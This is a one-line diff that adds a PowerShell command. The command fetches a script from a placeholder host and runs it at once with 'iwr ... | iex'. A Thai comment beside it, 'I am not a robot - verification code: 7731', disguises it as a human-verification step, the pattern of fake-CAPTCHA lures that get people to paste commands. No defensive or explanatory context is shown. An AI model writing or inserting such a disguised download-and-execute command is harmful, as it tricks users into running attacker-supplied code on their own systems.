@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # ฉันไม่ใช่หุ่นยนต์ - รหัสยืนยัน: 7731
